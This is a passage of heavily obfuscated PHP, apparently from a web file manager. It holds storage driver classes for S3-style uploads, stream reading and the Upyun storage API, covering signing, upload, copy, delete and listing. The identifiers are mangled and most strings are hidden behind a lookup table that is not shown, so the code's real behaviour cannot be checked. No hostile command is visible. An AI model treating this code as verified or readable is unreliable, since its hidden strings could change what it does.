{ $ë•ÑáÇó[$ÚÁúıı…] = array(); } $ˆîŠïÇ[$Ğıèö[177]] = $ÑÙ²Ğü¢; $ˆîŠïÇ[$Ğıèö[176]] = $ÚÁúıı…; $ë•ÑáÇó[$ÚÁúıı…][] =& $ˆîŠïÇ; if (count($ë•ÑáÇó[$ÚÁúıı…]) > 1) { $ˆîŠïÇ[$Ğıèö[606]] = !0; } Hook::trigger($Ğıèö[608], $ˆîŠïÇ); } unset($ˆîŠïÇ); $Ñ÷Ğ¡‡Ï = array($Ğıèö[176] => array($Ğıèö[7], array_keys($ë•ÑáÇó))); $šãØéØ¤ = Model($Ğıèö[609]); $æùç¶â´ = $šãØéØ¤->where($Ñ÷Ğ¡‡Ï)->select(); $æùç¶â´ = $æùç¶â´ ? $æùç¶â´ : array(); foreach ($æùç¶â´ as $ôÌèæ„è) { if (!isset($ë•ÑáÇó[$ôÌèæ„è[$Ğıèö[176]]])) { continue; } $ Œ¬ˆ¤° = $ë•ÑáÇó[$ôÌèæ„è[$Ğıèö[176]]]; foreach ($ Œ¬ˆ¤° as &$ˆîŠïÇ) { $ˆîŠïÇ[$Ğıèö[468]] = $ôÌèæ„è[$Ğıèö[468]]; $ˆîŠïÇ[$Ğıèö[606]] = !0; } unset($ˆîŠïÇ); } $ÅÉŸÃ£³ = array(); foreach ($ÆˆÚŠíÜ as $—ãä’Ó) { Hook::trigger($Ğıèö[610], $—ãä’Ó); if (isset($—ãä’Ó[$Ğıèö[606]]) && $—ãä’Ó[$Ğıèö[606]]) { Hook::trigger($Ğıèö[611], $—ãä’Ó); continue; } $›Ì”ô›œ = $í†í˜şÄ->getPathInner($—ãä’Ó[$Ğıèö[84]]); $¦ŸôïíÇ = $šãØéØ¤->addFileMake($›Ì”ô›œ, $—ãä’Ó[$Ğıèö[76]], $—ãä’Ó[$Ğıèö[177]], $—ãä’Ó[$Ğıèö[176]], $—ãä’Ó[$Ğıèö[32]], $Ìó‹ŞªÉ); Hook::trigger($Ğıèö[611], $—ãä’Ó); if (!is_array($¦ŸôïíÇ)) { continue; } $ÅÉŸÃ£³[] = $¦ŸôïíÇ; } $šãØéØ¤->addAll($ÅÉŸÃ£³); $Ñ÷Ğ¡‡Ï = array($Ğıèö[176] => array($Ğıèö[7], array_keys($ë•ÑáÇó))); $æùç¶â´ = $šãØéØ¤->where($Ñ÷Ğ¡‡Ï)->select(); $æùç¶â´ = $æùç¶â´ ? $æùç¶â´ : array(); foreach ($æùç¶â´ as $ôÌèæ„è) { if (!isset($ë•ÑáÇó[$ôÌèæ„è[$Ğıèö[176]]])) { continue; } $ÂÂ¯Æ‡© =& $ë•ÑáÇó[$ôÌèæ„è[$Ğıèö[176]]]; foreach ($ÂÂ¯Æ‡© as &$ˆîŠïÇ) { $ˆîŠïÇ[$Ğıèö[468]] = $ôÌèæ„è[$Ğıèö[468]]; } unset($ˆîŠïÇ); } $Íæñ÷ş± = array(); foreach ($ÆˆÚŠíÜ as $ÚÉ…Á ®) { $Íæñ÷ş±[$ÚÉ…Á ®[$Ğıèö[32]]] = $ÚÉ…Á ®; } return $Íæñ÷ş±; } } goto f†“ö™‚ƒî; F“Œº³¨‘ß: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($¥¢Õ¿Õ†) { parent::__construct($¥¢Õ¿Õ†); } public function uploadFormData($¹ÏÄ –ô, $Œ´ÉåÍ¹ = 3600) { $ªÒ¢ş =& $_SERVER[ä¿÷‹µ±]; $·´­×ê‡ = $ªÒ¢ş[198]; $ò²ù¨‰ë = $ªÒ¢ş[1368]; $²Ÿ±½Ú = $ªÒ¢ş[62]; $‘ÁÊ‘ö = gmdate($ªÒ¢ş[1369]); $¿ëşƒ‘ = gmdate($ªÒ¢ş[770]); $•¸õŠ÷ = $ªÒ¢ş[1370]; $ºã¶±ƒÈ = $Œ´ÉåÍ¹ . $ªÒ¢ş[12]; $Ä˜È°¾¨ = $ªÒ¢ş[1332]; $Ç¡ÎºÜù = array($this->accessKey, $¿ëşƒ‘, $this->region, $²Ÿ±½Ú, $•¸õŠ÷); $¦£‰İª  = implode($ªÒ¢ş[8], $Ç¡ÎºÜù); $§’Ù¦¸ß = array($ªÒ¢ş[1334] => gmdate($ªÒ¢ş[1333], strtotime($ªÒ¢ş[1371])), $ªÒ¢ş[1335] => array(array($ªÒ¢ş[1337] => $this->bucket), array($ªÒ¢ş[1336] => $·´­×ê‡), array($ªÒ¢ş[1338], $ªÒ¢ş[1339], $ªÒ¢ş[12]), array($ªÒ¢ş[1338], $ªÒ¢ş[1372], $ªÒ¢ş[12]), array($ªÒ¢ş[1338], $ªÒ¢ş[1373], $ªÒ¢ş[12]), array($ªÒ¢ş[1340] => $Ä˜È°¾¨), array($ªÒ¢ş[1374] => $¦£‰İª ), array($ªÒ¢ş[1375] => $ò²ù¨‰ë), array($ªÒ¢ş[1376] => $‘ÁÊ‘ö), array($ªÒ¢ş[1377] => $ºã¶±ƒÈ))); $ÏíÏ¤ú» = base64_encode(json_encode($§’Ù¦¸ß)); $¨ÒƒÓº = hash_hmac($ªÒ¢ş[1378], $¿ëşƒ‘, $ªÒ¢ş[1379] . $this->secret, !0); $Åí­‰¨® = hash_hmac($ªÒ¢ş[1378], $this->region, $¨ÒƒÓº, !0); $Š‚²İ› = hash_hmac($ªÒ¢ş[1378], $²Ÿ±½Ú, $Åí­‰¨®, !0); $Ùº¥ë¿ã = hash_hmac($ªÒ¢ş[1378], $•¸õŠ÷, $Š‚²İ›, !0); $ã¬ı’¥² = hash_hmac($ªÒ¢ş[1378], $ÏíÏ¤ú», $Ùº¥ë¿ã); $µïüŞÕ¦ = array($ªÒ¢ş[215] => $ªÒ¢ş[12], $ªÒ¢ş[1380] => $ªÒ¢ş[12], $ªÒ¢ş[1336] => $·´­×ê‡, $ªÒ¢ş[1340] => $Ä˜È°¾¨, $ªÒ¢ş[1344] => $ÏíÏ¤ú», $ªÒ¢ş[1381] => $¦£‰İª , $ªÒ¢ş[1382] => $ò²ù¨‰ë, $ªÒ¢ş[1383] => $‘ÁÊ‘ö, $ªÒ¢ş[1384] => $ºã¶±ƒÈ, $ªÒ¢ş[1385] => $ã¬ı’¥², $ªÒ¢ş[181] => $this->getHost()); return $µïüŞÕ¦; } public function multiUploadFormData($›µ¨üßÉ, $µêĞ²Úô = 3600) { $ÆÂ–¤Ú¯ =& $_SERVER[ä¿÷‹µ±]; $úîèŞ§ = gmdate($ÆÂ–¤Ú¯[1464]); $ÖóÙŠúĞ = array(); $Ê¼ëßş„ = $this->client->getUploadId($this->bucket, $›µ¨üßÉ, $ÖóÙŠúĞ); if (!$Ê¼ëßş„) { return !1; } return array($ÆÂ–¤Ú¯[223] => $Ê¼ëßş„, $ÆÂ–¤Ú¯[181] => $this->getHost() . $ÆÂ–¤Ú¯[8] . $this->pathEncode($›µ¨üßÉ), $ÆÂ–¤Ú¯[224] => $úîèŞ§, $ÆÂ–¤Ú¯[94] => $›µ¨üßÉ); } public function multiUploadAuthData($ûÚ²¶Ë, $™©‡äÛ„ = array()) { $¼±æÆ×ó =& $_SERVER[ä¿÷‹µ±]; $µüÌñşı = isset($™©‡äÛ„[$¼±æÆ×ó[174]]) ? $™©‡äÛ„[$¼±æÆ×ó[174]] : $¼±æÆ×ó[12]; $ƒøÚ­ = $™©‡äÛ„[$¼±æÆ×ó[94]]; unset($™©‡äÛ„[$¼±æÆ×ó[94]]); if (isset($™©‡äÛ„[$¼±æÆ×ó[225]])) { return $this->listUploadParts($ƒøÚ­, $™©‡äÛ„); } $¶¾æó¢ = array(); if (isset($™©‡äÛ„[$¼±æÆ×ó[1465]])) { $¶¾æó¢[$¼±æÆ×ó[1466]] = $™©‡äÛ„[$¼±æÆ×ó[1465]]; } $Ğíò®£š = explode($¼±æÆ×ó[183], $this->getHost()); $«¯¹µÁÓ = array($¼±æÆ×ó[1467] => $Ğíò®£š[1], $¼±æÆ×ó[1468] => $¼±æÆ×ó[12], $¼±æÆ×ó[215] => $¼±æÆ×ó[120], $¼±æÆ×ó[1380] => $™©‡äÛ„[$¼±æÆ×ó[76]]); $œŠÙÏ’ = $¼±æÆ×ó[228]; $¥Ú„ù = $¼±æÆ×ó[8] . $this->pathEncode($ƒøÚ­) . $µüÌñşı; $ö•Ô„ˆá = $this->client->__getSignatureV4($¶¾æó¢, $«¯¹µÁÓ, $œŠÙÏ’, $¥Ú„ù); if (strpos($µüÌñşı, $¼±æÆ×ó[227]) === 0) { if (isset($¶¾æó¢[$¼±æÆ×ó[1466]])) { $Á‹‘Î¦È = $¶¾æó¢[$¼±æÆ×ó[1466]]; } else { if (isset($ö•Ô„ˆá[$¼±æÆ×ó[1466]])) { $Á‹‘Î¦È = $ö•Ô„ˆá[$¼±æÆ×ó[1466]]; } else { $Á‹‘Î¦È = hash($¼±æÆ×ó[1378], $¼±æÆ×ó[12]); } } return array($¼±æÆ×ó[234] => $ö•Ô„ˆá[$¼±æÆ×ó[234]], $¼±æÆ×ó[1466] => $Á‹‘Î¦È, $¼±æÆ×ó[224] => $ö•Ô„ˆá[$¼±æÆ×ó[1469]]); } return $ö•Ô„ˆá[$¼±æÆ×ó[234]]; } public function listUploadParts($şÁÍäÂ¯, $²¬´±­³ = array()) { $ä±ÇÚÏ =& $_SERVER[ä¿÷‹µ±]; $“ÂÖÏùú = str_replace($ä±ÇÚÏ[235], $ä±ÇÚÏ[12], $²¬´±­³[$ä±ÇÚÏ[174]]); $“›ôø« = $this->client->listParts($this->bucket, $şÁÍäÂ¯, $“ÂÖÏùú); if (!$“›ôø«) { return !1; } $êİÑ¶›– = $ä±ÇÚÏ[1470]; foreach ($“›ôø« as $ÕÁ–ÛÉ‘) { $êİÑ¶›– .= $ä±ÇÚÏ[1471] . "\x3c\x50\x61\x72\x74\116\165\x6d\x62\145\162\x3e{$ÕÁ–ÛÉ‘[$ä±ÇÚÏ[1425]]}\74\57\x50\x61\x72\x74\x4e\165\x6d\142\x65\162\x3e\xa" . "\74\105\124\141\147\x3e{$ÕÁ–ÛÉ‘[$ä±ÇÚÏ[1426]]}\x3c\x2f\105\x54\141\x67\76\12" . $ä±ÇÚÏ[1472]; } $êİÑ¶›– .= $ä±ÇÚÏ[1473]; $êö‚¡† = array(); $ŒàÏ·°× = explode($ä±ÇÚÏ[183], $this->getHost()); $Ñ‚ù‚÷ = array($ä±ÇÚÏ[1467] => $ŒàÏ·°×[1], $ä±ÇÚÏ[215] => $ä±ÇÚÏ[120], $ä±ÇÚÏ[1380] => strlen($êİÑ¶›–)); $±¤ö¹ÆÄ = $ä±ÇÚÏ[226]; $´ãÏ¿ = $ä±ÇÚÏ[8] . $this->pathEncode($şÁÍäÂ¯) . $²¬´±­³[$ä±ÇÚÏ[174]]; $¶äœ¥à¦ = $this->client->__getSignatureV4($êö‚¡†, $Ñ‚ù‚÷, $±¤ö¹ÆÄ, $´ãÏ¿, $êİÑ¶›–); return array($ä±ÇÚÏ[234] => $¶äœ¥à¦[$ä±ÇÚÏ[234]], $ä±ÇÚÏ[224] => $¶äœ¥à¦[$ä±ÇÚÏ[1469]], $ä±ÇÚÏ[236] => $“›ôø«, $ä±ÇÚÏ[1466] => $¶äœ¥à¦[$ä±ÇÚÏ[1466]]); } public function link($Ÿ²­îåó, $ÓƒãêÒ = array()) { return parent::link($Ÿ²­îåó, $ÓƒãêÒ); } public function fileOut($ºÜ„Ãç£, $ä„•‹ë© = false, $Ó‹È‰¶ó = false, $ş¯Ò… = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ä¿÷‹µ±][1474])) { return parent::fileOutServer($ºÜ„Ãç£, $ä„•‹ë©, $Ó‹È‰¶ó, $ş¯Ò…); } parent::fileOut($ºÜ„Ãç£, $ä„•‹ë©, $Ó‹È‰¶ó, $ş¯Ò…); } public function fileOutImage($¸¹Âø»ø, $ß™èÎêÁ = 250) { if (strstr($this->endpoint, $_SERVER[ä¿÷‹µ±][1474])) { return parent::fileOutImageServer($¸¹Âø»ø, $ß™èÎêÁ); } parent::fileOutImage($¸¹Âø»ø, $ß™èÎêÁ); } public function fileOutLink($½±¯â€Ô) { $ÒÑ×¹ùí =& $_SERVER[ä¿÷‹µ±]; if (substr($½±¯â€Ô, 0, 7) == $ÒÑ×¹ùí[1347]) { $½±¯â€Ô = $ÒÑ×¹ùí[1348] . substr($½±¯â€Ô, 7); } header($ÒÑ×¹ùí[161] . $½±¯â€Ô); die; } public function getHost() { $€³µãŞâ =& $_SERVER[ä¿÷‹µ±]; $ú³ºñùí = str_rtrim(parent::getHost(), $€³µãŞâ[8] . $this->bucket); $ú³ºñùí = explode($€³µãŞâ[183], $ú³ºñùí); return $ú³ºñùí[0] . $€³µãŞâ[183] . $this->bucket . $€³µãŞâ[10] . $ú³ºñùí[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($‚¤ˆÖöÁ, $ÛÕÛĞƒ§ = 0) { parent::__construct(); $this->source = $‚¤ˆÖöÁ; $this->sourceSize = $ÛÕÛĞƒ§; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ñš¡ı­à = false) { return $this->sourceSize; } public function getContent($±×ì¸Š = false) { return $this->fileSubstr($±×ì¸Š, 0, $this->sourceSize); } public function fileSubstr($ëıÓ¦¦ = false, $Ø´êô“­ = 0, $—ò¡´áã = 0) { if (!$—ò¡´áã) { $—ò¡´áã = $this->sourceSize; } $…öõÍù = $this->sourceSize - $Ø´êô“­; if ($—ò¡´áã >= $…öõÍù) { $—ò¡´áã = $…öõÍù; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Ø´êô“­, $—ò¡´áã); } if ($this->sourceType == self::TYPE_FILE) { if ($—ò¡´áã <= 0) { return $_SERVER[ä¿÷‹µ±][12]; } $²×Û´Øô = ftell($this->source); fseek_64($this->source, $²×Û´Øô + $Ø´êô“­); $ŒÊñ€« = @fread($this->source, $—ò¡´áã); fseek_64($this->source, $²×Û´Øô); return $ŒÊñ€«; } } public function hashMd5($Øë˜Šó = false) { return md5($this->getContent()); } public static function hash($ÄÙèçÊ, $ù¡û£ğ = 0) { $³õ’¦…ï = new PathDriverStream($ÄÙèçÊ, $ù¡û£ğ); return $³õ’¦…ï->hashSimple($ÄÙèçÊ); } public static function md5($Á£ÂÁœâ, $“¢€¶» = 0) { $˜…Æ×ÓÉ = new PathDriverStream($Á£ÂÁœâ, $“¢€¶»); return $˜…Æ×ÓÉ->hashMd5($Á£ÂÁœâ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\160\72\57\57\166\x30\x2e\141\160\151\56\165\160\x79\x75\x6e\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ó’Ãíû¤) { parent::__construct(); $this->_init($Ó’Ãíû¤); } public function _init($¾ÃÜÙÜ) { $®‡Ò¢è® =& $_SERVER[ä¿÷‹µ±]; foreach ($¾ÃÜÙÜ as $¡Öô¸Â“ => $‹ü¨˜Ôø) { if (isset($this->{$¡Öô¸Â“})) { $this->{$¡Öô¸Â“} = $‹ü¨˜Ôø; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($®‡Ò¢è®[1475] . LNG($®‡Ò¢è®[1406])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($à¬´î€, $ßØİŠó = "\107\105\x54") { $Ê¿¦—™Ö =& $_SERVER[ä¿÷‹µ±]; $”±¸ÂÈ = gmdate($Ê¿¦—™Ö[1439]); $âøØ†ÔÎ = base64_encode(hash_hmac($Ê¿¦—™Ö[1476], "{$ßØİŠó}\x26{$à¬´î€}\46{$”±¸ÂÈ}", md5("{$this->userpass}"), !0)); $“ƒ×¯È¥ = array("\101\x75\x74\x68\x6f\x72\x69\172\141\x74\151\157\x6e\72\x55\x50\131\x55\116\40{$this->username}\x3a{$âøØ†ÔÎ}", "\x44\x61\x74\x65\72{$”±¸ÂÈ}"); return $“ƒ×¯È¥; } public function ussRequest($Å´—€ş, $¶âÁ¡ÔÊ = "\107\x45\x54", $ÁÏ×¯  = false, $ê†ÑĞÜ» = false, $ô×ïæÕ = false) { $ÁÃñªâ =& $_SERVER[ä¿÷‹µ±]; $Å´—€ş = trim($Å´—€ş, $ÁÃñªâ[8]); $¤¿„÷¼ = "\x2f{$this->bucket}\x2f{$Å´—€ş}"; $«¬¹Ÿíá = $this->ussHeaders($¤¿„÷¼, $¶âÁ¡ÔÊ); if ($ê†ÑĞÜ») { $«¬¹Ÿíá = array_merge($«¬¹Ÿíá, $ê†ÑĞÜ»); } $›ÀÅÂĞ = url_request($this->endpoint . $¤¿„÷¼, $¶âÁ¡ÔÊ, $ÁÏ×¯ , $«¬¹Ÿíá, $ô×ïæÕ); if (!$›ÀÅÂĞ) { return array($ÁÃñªâ[1213] => !1, $ÁÃñªâ[1215] => $ÁÃñªâ[1477]); } if (strtolower($¶âÁ¡ÔÊ) == $ÁÃñªâ[196] || in_array($›ÀÅÂĞ[$ÁÃñªâ[1213]], array($ÁÃñªâ[1332], $ÁÃñªâ[1478]))) { $ÁÏ×¯  = $›ÀÅÂĞ[$ÁÃñªâ[1479]]; } else { $ÁÏ×¯  = json_decode($›ÀÅÂĞ[$ÁÃñªâ[1215]], !0); if (!$ÁÏ×¯ ) { $ÁÏ×¯  = $›ÀÅÂĞ[$ÁÃñªâ[1215]]; } else { if (!$›ÀÅÂĞ[$ÁÃñªâ[769]] && isset($ÁÏ×¯ [$ÁÃñªâ[1480]])) { $ÁÏ×¯  = $ÁÏ×¯ [$ÁÃñªâ[1480]]; } } } return array($ÁÃñªâ[1213] => $›ÀÅÂĞ[$ÁÃñªâ[769]], $ÁÃñªâ[1215] => $ÁÏ×¯ ); } public function mkfile($ ÒÆŸ”µ, $º¡¬€ª· = '', $—é¤ğ­ = REPEAT_RENAME) { if ($this->setContent($ ÒÆŸ”µ, $º¡¬€ª·)) { return $this->getPathOuter($ ÒÆŸ”µ); } return !1; } public function mkdir($¹ï·İ…á, $ñ«Ç›–À = REPEAT_SKIP) { $µ±°„Ã¸ =& $_SERVER[ä¿÷‹µ±]; $¯ò›ÊŞé = trim($¹ï·İ…á, $µ±°„Ã¸[8]); if ($this->_isFolder($¯ò›ÊŞé)) { return $this->getPathOuter($¯ò›ÊŞé); } $ğ÷µÆ§ê = array($µ±°„Ã¸[1481]); $ªûÎÔÔö = $this->ussRequest($¯ò›ÊŞé, $µ±°„Ã¸[226], !1, $ğ÷µÆ§ê); return $ªûÎÔÔö[$µ±°„Ã¸[1213]] ? $this->getPathOuter($¯ò›ÊŞé) : !1; } public function copyFile($Ïç‰ì‹€, $êüÛÈÁ€) { $‰¶®«éã =& $_SERVER[ä¿÷‹µ±]; $¾Ã¼ı²Ê = array($‰¶®«éã[1482] . "\57{$this->bucket}\57{$Ïç‰ì‹€}", $‰¶®«éã[1483]); $°„Îš· = $this->ussRequest($êüÛÈÁ€, $‰¶®«éã[228], !1, $¾Ã¼ı²Ê); return $°„Îš·[$‰¶®«éã[1213]] ? !0 : $this->getPathOuter($êüÛÈÁ€); } public function moveFile($‡ìÛ ’î, $—È­ñˆ) { $±”´Êİã =& $_SERVER[ä¿÷‹µ±]; $×©®ıú­ = array($±”´Êİã[1484] . "\x2f{$this->bucket}\57{$‡ìÛ ’î}", $±”´Êİã[1483]); $ê÷À¾óî = $this->ussRequest($—È­ñˆ, $±”´Êİã[228], !1, $×©®ıú­); return $ê÷À¾óî[$±”´Êİã[1213]] ? !0 : $this->getPathOuter($—È­ñˆ); } public function delFile($Ğ¥ıŒë) { $Óï™ÊÅÎ =& $_SERVER[ä¿÷‹µ±]; $µù ù¯ = $this->ussRequest($Ğ¥ıŒë, $Óï™ÊÅÎ[1485]); return $µù ù¯[$Óï™ÊÅÎ[1213]] ? !0 : !1; } public function delFolder($óÊ£½È¥) { $§µš‡¼Ú =& $_SERVER[ä¿÷‹µ±]; if (!$this->exist($óÊ£½È¥)) { return !0; } $this->listItemCache = !1; $ÎœŠœã² = $Ë„‹ƒ‰´ = array(); $this->fileList($óÊ£½È¥, $ÎœŠœã², $Ë„‹ƒ‰´, !0); $this->listItemCache = !0; foreach ($Ë„‹ƒ‰´ as $ÛÏìÜñÛ) { $‹Ø•˜È­ = $this->ussRequest($ÛÏìÜñÛ[$§µš‡¼Ú[32]], $§µš‡¼Ú[1485]); if (!$‹Ø•˜È­[$§µš‡¼Ú[1213]]) { return !1; } } foreach ($ÎœŠœã² as $Ø¶ÈÚè) { $‹Ø•˜È­ = $this->ussRequest($Ø¶ÈÚè, $§µš‡¼Ú[1485]); if (!$‹Ø•˜È­[$§µš‡¼Ú[1213]]) { return !1; } } $‹Ø•˜È­ = $this->ussRequest($óÊ£½È¥, $§µš‡¼Ú[1485]); return $‹Ø•˜È­[$§µš‡¼Ú[1213]]; } public function rename($ÅÛÆ‹ÚÓ, $®äÏ’ó›) { if ($this->isFile($ÅÛÆ‹ÚÓ)) { $®äÏ’ó› = get_path_father($ÅÛÆ‹ÚÓ) . $®äÏ’ó›; return $this->moveFile($ÅÛÆ‹ÚÓ, $®äÏ’ó›); } return $this->renameObject($ÅÛÆ‹ÚÓ, $®äÏ’ó›); } public function fileInfo($íŠş§©İ, $øÑ–ïŞ© = false, $ÓïÊ„Ì = array()) { $‡¾ƒ­³š =& $_SERVER[ä¿÷‹µ±]; $­£ø²Àˆ = array($‡¾ƒ­³š[32] => $this->pathThis($íŠş§©İ), $‡¾ƒ­³š[84] => $this->getPathOuter($‡¾ƒ­³š[8] . $íŠş§©İ), $‡¾ƒ­³š[33] => $‡¾ƒ­³š[199], $‡¾ƒ­³š[76] => isset($ÓïÊ„Ì[$‡¾ƒ­³š[76]]) ? $ÓïÊ„Ì[$‡¾ƒ­³š[76]] : 0, $‡¾ƒ­³š[174] => $this->ext($íŠş§©İ)); if ($øÑ–ïŞ©) { return $­£ø²Àˆ; } $­£ø²Àˆ[$‡¾ƒ­³š[200]] = $­£ø²Àˆ[$‡¾ƒ­³š[85]] = 0; $­£ø²Àˆ[$‡¾ƒ­³š[201]] = $­£ø²Àˆ[$‡¾ƒ­³š[202]] = !0; if (empty($ÓïÊ„Ì)) { $ÓïÊ„Ì = $this->objectMeta($íŠş§©İ); if (!$ÓïÊ„Ì) { return $­£ø²Àˆ; } } $­£ø²Àˆ[$‡¾ƒ­³š[200]] = intval($ÓïÊ„Ì[$‡¾ƒ­³š[1486]]); $­£ø²Àˆ[$‡¾ƒ­³š[85]] = intval($ÓïÊ„Ì[$‡¾ƒ­³š[1487]]); $­£ø²Àˆ[$‡¾ƒ­³š[76]] = $ÓïÊ„Ì[$‡¾ƒ­³š[76]]; return $­£ø²Àˆ; } public function folderInfo($Õ—±š¹ò, $ãÌ¡‡ı = false) { $ÉìãÙ½ =& $_SERVER[ä¿÷‹µ±]; $Ì¬òÉ³Ñ = array($ÉìãÙ½[32] => $this->pathThis($Õ—±š¹ò), $ÉìãÙ½[84] => $this->getPathOuter($ÉìãÙ½[8] . $Õ—±š¹ò), $ÉìãÙ½[33] => $ÉìãÙ½[75]); if ($ãÌ¡‡ı) { return $Ì¬òÉ³Ñ; } $Ì¬òÉ³Ñ[$ÉìãÙ½[200]] = $Ì¬òÉ³Ñ[$ÉìãÙ½[85]] = 0; $Ì¬òÉ³Ñ[$ÉìãÙ½[201]] = $Ì¬òÉ³Ñ[$ÉìãÙ½[202]] = !0; if (empty($îâØÅì)) { $îâØÅì = $this->objectMeta($Õ—±š¹ò); if (!$îâØÅì) { return $Ì¬òÉ³Ñ; } } $Ì¬òÉ³Ñ[$ÉìãÙ½[200]] = intval($îâØÅì[$ÉìãÙ½[1486]]); $Ì¬òÉ³Ñ[$ÉìãÙ½[85]] = intval($îâØÅì[$ÉìãÙ½[1487]]); return $Ì¬òÉ³Ñ; } private function listObjs($Šé–«¯Á, $ıÃæòËË = 0, $ËÃ«ÆÖ = 1000) { $©ÕÌŞ‰œ =& $_SERVER[ä¿÷‹µ±]; $ºÂ±ôù½ = array($©ÕÌŞ‰œ[1488], $©ÕÌŞ‰œ[1489] . $ËÃ«ÆÖ); if ($ıÃæòËË) { $ºÂ±ôù½[] = $©ÕÌŞ‰œ[1490] . $ıÃæòËË; } $‹ß¿ªïê = $this->ussRequest($Šé–«¯Á, $©ÕÌŞ‰œ[230], !1, $ºÂ±ôù½); return !$‹ß¿ªïê[$©ÕÌŞ‰œ[1213]] ? !1 : $‹ß¿ªïê[$©ÕÌŞ‰œ[1215]]; } private function fileList($Ô¹¨ë, &$¯Ë ˜·¡, &$õÛñ’ö, $È›Ï‘‡ = false) { $ÁŒã˜¦ê =& $_SERVER[ä¿÷‹µ±]; $ªóçÀ¢ = $ÁŒã˜¦ê[12]; $ôãã±â÷ = 1000; $¸×Ñ†Š¾ = rtrim($Ô¹¨ë, $ÁŒã˜¦ê[8]) . $ÁŒã˜¦ê[8]; while (!0) { check_abort(); $ıÈŸÓ¥ = $this->listObjs($Ô¹¨ë, $ªóçÀ¢, $ôãã±â÷); if (!$ıÈŸÓ¥) { return !1; } $ªóçÀ¢ = isset($ıÈŸÓ¥[$ÁŒã˜¦ê[1491]]) ? $ıÈŸÓ¥[$ÁŒã˜¦ê[1491]] : $ÁŒã˜¦ê[12]; $Šı™² = isset($ıÈŸÓ¥[$ÁŒã˜¦ê[1492]]) ? $ıÈŸÓ¥[$ÁŒã˜¦ê[1492]] : array(); foreach ($Šı™² as $öº›ƒû¢) { $ê½Ãë÷¦ = $öº›ƒû¢[$ÁŒã˜¦ê[33]] == $ÁŒã˜¦ê[75] ? !0 : !1; $øğéûÎñ = ltrim($¸×Ñ†Š¾ . $öº›ƒû¢[$ÁŒã˜¦ê[32]], $ÁŒã˜¦ê[8]) . ($ê½Ãë÷¦ ? $ÁŒã˜¦ê[8] : $ÁŒã˜¦ê[12]); $ÖĞÂõî¯ = array($ÁŒã˜¦ê[32] => $øğéûÎñ, $ÁŒã˜¦ê[33] => $ê½Ãë÷¦ ? $ÁŒã˜¦ê[75] : $ÁŒã˜¦ê[199], $ÁŒã˜¦ê[76] => $öº›ƒû¢[$ÁŒã˜¦ê[337]], $ÁŒã˜¦ê[1487] => $öº›ƒû¢[$ÁŒã˜¦ê[1493]]); $this->cacheMethodInfoSet($øğéûÎñ, $ê½Ãë÷¦, $ÖĞÂõî¯); if ($ê½Ãë÷¦) { $¯Ë ˜·¡[] = $øğéûÎñ; if ($È›Ï‘‡) { $this->fileList($øğéûÎñ, $¯Ë ˜·¡, $õÛñ’ö, $È›Ï‘‡); } continue; } $õÛñ’ö[] = $ÖĞÂõî¯; } if (count($Šı™²) < $ôãã±â÷) { break; } } $this->cacheMethodInfoSet($Ô¹¨ë, !0); } public function listPath($è¹›†Ë, $Ã „‹’Ü = false) { $Ì˜èáá =& $_SERVER[ä¿÷‹µ±]; $¯÷Î¼Úä = $§™¿»½‚ = array(); $this->fileList($è¹›†Ë, $¯÷Î¼Úä, $§™¿»½‚); foreach ($¯÷Î¼Úä as $ÃÖ¡¿µ => $óÔöªÍ€) { $¯÷Î¼Úä[$ÃÖ¡¿µ] = $this->folderInfo($óÔöªÍ€, $Ã „‹’Ü); } foreach ($§™¿»½‚ as $ÃÖ¡¿µ => $óÔöªÍ€) { $§™¿»½‚[$ÃÖ¡¿µ] = $this->fileInfo($óÔöªÍ€[$Ì˜èáá[32]], $Ã „‹’Ü, $óÔöªÍ€); } return array($Ì˜èáá[82] => $¯÷Î¼Úä, $Ì˜èáá[83] => $§™¿»½‚); } public function has($¨‹ã”×ì, $‚ÕÔå£ˆ = false, $–Â¼Éå³ = true) { $«²¬¾—¯ =& $_SERVER[ä¿÷‹µ±]; $ µ¨æ–¨ = $«²¬¾—¯[12]; $ğİŒòˆÈ = 500; $»ôÒÇùê = 0; $ä½«‹Õ = 0; $©ô×’ã¯ = rtrim($¨‹ã”×ì, $«²¬¾—¯[8]) . $«²¬¾—¯[8]; while (!0) { check_abort(); $ŞªŸ¬— = $this->listObjs($¨‹ã”×ì, $ µ¨æ–¨, $ğİŒòˆÈ); if (!$ŞªŸ¬—) { return !1; } $ µ¨æ–¨ = isset($ŞªŸ¬—[$«²¬¾—¯[1491]]) ? $ŞªŸ¬—[$«²¬¾—¯[1491]] : $«²¬¾—¯[12]; $ØşÖçö = isset($ŞªŸ¬—[$«²¬¾—¯[1492]]) ? $ŞªŸ¬—[$«²¬¾—¯[1492]] : array(); if (empty($ØşÖçö)) { break; } $Ï®Ñ××Â = array_filter($ØşÖçö, function ($ü¹«ûì©) { $½…ÄßÖ• =& $_SERVER[ä¿÷‹µ±]; return $ü¹«ûì©[$½…ÄßÖ•[33]] == $½…ÄßÖ•[75]; }); $â¼Ü³û = count($ØşÖçö); $Ï®Ñ××Â = count($Ï®Ñ××Â); $Ãøø…ıŒ = $â¼Ü³û - $Ï®Ñ××Â; if ($‚ÕÔå£ˆ) { $ä½«‹Õ += $Ï®Ñ××Â; $»ôÒÇùê += $Ãøø…ıŒ; if ($â¼Ü³û < $ğİŒòˆÈ) { break; } continue; } if ($–Â¼Éå³) { if ($Ãøø…ıŒ) { return !0; } } else { if ($Ï®Ñ××Â) { return !0; } } if ($â¼Ü³û < $ğİŒòˆÈ) { break; } } if ($‚ÕÔå£ˆ) { return array($«²¬¾—¯[207] => $»ôÒÇùê, $«²¬¾—¯[208] => $ä½«‹Õ); } return !1; } public function listAll($’¨Èë¤œ) { $ëĞ×ãÆ² =& $_SERVER[ä¿÷‹µ±]; 